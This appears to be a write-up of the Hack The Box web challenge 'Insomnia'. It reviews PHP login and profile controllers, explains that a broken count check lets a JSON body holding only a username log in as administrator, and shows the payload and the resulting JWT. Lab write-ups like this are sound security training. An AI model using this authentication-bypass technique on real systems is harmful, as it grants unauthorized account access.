---
title: Insomnia - Hack The Box
date: 2024-10-23
---

# Insomnia

![Insomnia - thumbnail](/ctf/hack-the-box/challenges/web/insomnia/insomnia-thumbnail.gif)

## Box description

Welcome back to Insomnia Factory, where you might have to work under the enchanting glow of the moon, crafting dreams
and weaving sleepless tales.

## Challenge description

The web application provides several pages: Home, Sign-up, Sign-in, and Profile. Users can create accounts via the
Sign-up form and log in using the Sign-in page.

Once logged in, users are redirected to their profile page. Here's an example of the profile page after login:

![Insomnia - profile page](/ctf/hack-the-box/challenges/web/insomnia/insomnia-profile-page.png)

The challenge lies in exploiting the login mechanism to gain access to the administrator's profile and retrieve the
flag.

## Code review

### Profile controller

The profile controller contains the logic for rendering the profile page, including how the flag is revealed to
administrators.

```php:line-numbers {7}
$token = (string) $_COOKIE["token"] ?? null;
$flag = file_get_contents(APPPATH . "/../flag.txt");
if (isset($token)) {
    $key = (string) getenv("JWT_SECRET");
    $jwt_decode = JWT::decode($token, new Key($key, "HS256"));
    $username = $jwt_decode->username;
    if ($username == "administrator") {
        return view("ProfilePage", [
            "username" => $username,
            "content" => $flag,
        ]);
    } else {
        $content = "Haven't seen you for a while";
        return view("ProfilePage", [
            "username" => $username,
            "content" => $content,
        ]);
    }
}
```

The flag is only displayed if the `username` in the decoded **JWT** token is **administrator**.

### User controller

The **login** function in the user controller contains a vulnerability that allows bypassing the login process with a
crafted payload.

```php:line-numbers {5,8}
public function login()
{
    $db = db_connect();
    $json_data = request()->getJSON(true);
    if (!count($json_data) == 2) {
        return $this->respond("Please provide username and password", 404);
    }
    $query = $db->table("users")->getWhere($json_data, 1, 0);
    $result = $query->getRowArray();
    if (!$result) {
        return $this->respond("User not found", 404);
    } else {
        $key = (string) getenv("JWT_SECRET");
        $iat = time();
        $exp = $iat + 36000;
        $headers = [
            "alg" => "HS256",
            "typ" => "JWT",
        ];
        $payload = [
            "iat" => $iat,
            "exp" => $exp,
            "username" => $result["username"],
        ];
        $token = JWT::encode($payload, $key, "HS256");

        $response = [
            "message" => "Login Succesful",
            "token" => $token,
        ];
        return $this->respond($response, 200);
    }
}
```

Looking at the following condition `if (!count($json_data) == 2)` the login function expects an array with two elements.
But using `!count($json_data) == 2` instead of `count($json_data) !== 2` will always return false. So we can send an
array with one element to bypass the login.

To ensure that we can send our payload we need to check the `getWhere` function in the user controller. After digging
into the code we found that this function add a `where` clause to the query builder. So we can send a payload with only
the username field to bypass the login.

## Exploit

### Step 1: Bypass the Login

To exploit the vulnerability, we send a POST request to the login endpoint with a payload containing only the username:

```json
{
    "username": "administrator"
}
```

Using **Burp Suite**, we send this request and receive a successful response containing a JWT token for the
administrator:

```json
{
    "message": "Login Succesful",
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3Mjk2ODM3NDUsImV4cCI6MTcyOTcxOTc0NSwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIn0.Jn6DFrXpONJqBsVO1irVTjd4cpHkd7d8LaAwrlqWsao"
}
```

### Step 2: Access the Administrator Profile

Next, we set the JWT token in our browser's cookies and reload the profile page. The application verifies the token,
sees that the username is administrator, and displays the flag.

![Insomnia - flag](/ctf/hack-the-box/challenges/web/insomnia/insomnia-flag.png)

We successfully retrieve the flag! Now we can try our payload on the real **HTB** box to retrieve the flag

![Insomnia - pwned](/ctf/hack-the-box/challenges/web/insomnia/insomnia-pwned.png)
